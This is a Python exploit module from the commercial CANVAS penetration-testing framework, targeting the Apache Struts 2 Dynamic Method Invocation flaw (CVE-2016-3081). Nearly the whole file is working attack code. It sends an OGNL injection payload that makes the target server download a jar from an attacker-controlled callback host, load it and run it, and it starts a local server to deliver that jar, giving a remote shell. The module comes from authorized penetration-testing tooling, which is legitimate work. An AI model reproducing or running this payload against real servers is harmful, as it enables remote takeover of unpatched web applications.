#!/usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2006
# http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path:
    sys.path.append(".")


import urllib
import random
import libs.spkproxy as spkproxy

from exploitutils import *
from tcpexploit import *
from canvasexploit import *

NAME                            = "struts2_dmi_rce"
DESCRIPTION                     = "Remote Code Execution can be performed via method: prefix when Dynamic Method Invocation is enabled."
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Apache"
DOCUMENTATION['Repeatability']  = "Infinite"
DOCUMENTATION['CVE Name']       = "CVE-2016-3081"
DOCUMENTATION['CVE Url']        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3081"
DOCUMENTATION['References']     = "https://cwiki.apache.org/confluence/display/WW/S2-032"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['VERSION']             = ["2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3)"]

DOCUMENTATION['NOTES']          = """
The JAR Server will listen on the port provided in the UI. However, if that port is unavailable,
a random one will be chosen.

Example vulnerable application: struts2-showcase in Struts 2.3.20.1 (with Dynamic Method Invocation enabled)
Example URL: http://172.16.196.137:8080/struts2-showcase/showcase.action

Versions tested:

> Ubuntu Linux 14.04.1
Java 1.8.0.151/Tomcat 7.0.82/Struts 2.3.20.1
Java 1.8.0.151/Tomcat 7.0.82/Struts 2.3.24.1
Java 1.8.0.151/Tomcat 8.0.48/Struts 2.3.20.1
Java 1.8.0.151/Tomcat 8.0.48/Struts 2.3.24.1
Java 1.7.0.151/Tomcat 8.0.48/Struts 2.3.20.1
Java 1.7.0.151/Tomcat 8.0.48/Struts 2.3.24.1
"""

CHANGELOG                       = """
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 8080
        self.jarserver_port = 9999
        self.host = ""
        self.version = 0
        self.done = 0
        self.ssl = ""
        self.name = NAME
        self.basepath = ""
        self.test_params      = "?t=VULNERABLE&method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23str%3d%23parameters.t,%23res%3d@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23res.print(%23str[0]),%23res.flush(),%23res.close"

        self.mosdef_type = "UNIVERSAL"
        self.http_ssl = False

        # self.command            = None
        self.basicauth_user = ""
        self.basicauth_password = ""
        self.hostname = None
        self.content_type = ""

        self.ua = None

        self.targetpath = "/"

        self.javamosdef_data = None
        with open(os.path.join(os.path.dirname(__file__), "Resources", "mosdef.jar"), "rb") as handle:
            self.javamosdef_data = handle.read()

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host = self.target.interface
        self.getarg("hostname")
        if not self.hostname:
            self.hostname = self.host
        self.port = int(self.argsDict.get("port", self.port))
        self.basepath = self.argsDict.get("basepath", self.basepath)
        self.basicauth_user = self.argsDict.get("basicauth_user", None)
        self.basicauth_password = self.argsDict.get("basicauth_password", None)
        self.jarserver_port = int(self.argsDict.get("jarserver_port"))
        self.vhost = self.argsDict.get("vhost")
        self.ssl = self.argsDict.get("ssl", self.ssl)

        if self.ssl:
            protocol = "https"
        else:
            protocol = "http"

        self.base_url = protocol + "://" + self.hostname + ":" + str(self.port)
        self.ua = self.setup_UA()

        return

    def setup_UA(self):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            logging.info("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self)

        #ua = spkproxy.UserAgent(self.base_url, auth=auth, hostname=self.hostname, exploit=self, proxyhost="localhost", proxyport=8080)
        return ua


    def test_endpoint(self):
        logging.info("Testing if endpoint is up")

        (response, response_code) = self.ua.GET(self.basepath + self.test_params,
                                                noresponse=False,
                                                entireresponse=True,
                                                return_response_code=True)

        if response_code == 200:
            if "VULNERABLE" in response:
                logging.info("The endpoint seems to be vulnerable")
            else:
                logging.info("Got 200 but not expected response, might not be vulnerable")
            return True
        else:
            logging.error("Unexpected response")
            return False


    def send_struts_attack(self):

        payload = "".join([

                    "method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,",
                    "#newurl=new java.net.URL(#parameters.b[0]),",
                    "#urls=new java.net.URL[1],",
                    "@java.util.Arrays@fill(#urls, #newurl),",
                    "#mainargs=new java.lang.String[5],",
                    "#mainargs[0]=(#parameters.c[0]),",
                    "#mainargs[1]=(#parameters.d[0]),",
                    "#mainargs[2]=(#parameters.e[0]),",
                    "#mainargs[3]=(#parameters.f[0]),",
                    "(#mainobj=new java.lang.Object[1]),",
                    "(#mainobj[0]=#mainargs),",
                    "(#urlcl=new java.net.URLClassLoader(#urls)),",
                    "(#main_class=#urlcl.loadClass((#parameters.g[0]))),",
                    "(#main_method=#main_class.getMethods()),",
                    "(#main_method=#main_class.getMethods()),",
                    "(#obtained_null=#mainargs[4]),",
                    "(#called_method=#main_method[0]),",
                    "(#res=#called_method.invoke(#obtained_null,#mainargs)),",
                    "#res=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),",
                    "#res.print(#parameters.t[0]),",
                    "#res.flush(),",
                    "#res.close",

        ])

        logging.info(payload)

        self.send_struts_request(payload)
        logging.info("Waiting for callback on %s:%d" % (self.callback.ip, self.callback.port))


    def send_struts_request(self, payload):
        protocol = "https" if self.ssl else "http"

        host_name = self.host
        if self.vhost:
            host_name = self.vhost

        host_string = ("%s:%d" % (self.host, self.port)) if self.port != 80 else host_name
        target_string = "%s://%s" % (protocol, host_string)

        logging.info("Connecting to: %s" % (target_string))


        self.ua.addHeader("Host", host_string)
        self.ua.addHeader("Connection", "close")
        self.ua.addHeader("Accept-Encoding", "identity")
        self.ua.addHeader("User-Agent",
                          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36")

        params = "".join(["a=com.opensymphony.xwork2.ActionContext.container",
                         "&b=http://{}:{}/mosdef.jar".format(self.callback.ip,self.jarserver_port),
                         "&c={}&d={}".format(self.callback.ip,self.callback.port),
                         "&e=0&f=False&g=MosdefMain&t=Exploiting...&"])

        encoded_payload = payload.replace("=","%3d").replace("#","%23").replace("{","%7b").replace("}","%7d").replace(" ","%20")

        descriptor = self.ua.GET(self.basepath + "?" + params + encoded_payload,
                                                noresponse=True)

        return descriptor

    def setup_webserver(self):
        app = self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"] = self.jarserver_port
        app.argsDict["singleexploit"] = "upload"
        app.argsDict["auto_port"] = True
        app.argsDict["sourcedata"] = self.javamosdef_data
        return_value = app.listen()

        return app

    def run(self):
        self.getargs()

        self.server = self.setup_webserver()
        self.jarserver_port = self.server.port

        logging.info("Sending malicious request")

        self.test_endpoint()
        self.send_struts_attack()

        logging.info("Started server for MOSDEF JAR")

        got_connection = False
        while self.server.accept():
            got_connection = True

        if got_connection:
            logging.info("Got a connection to our jar server")
            return 1
        else:
            logging.error("Failed to get a connection to the MOSDEF JAR server")
            return 0


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)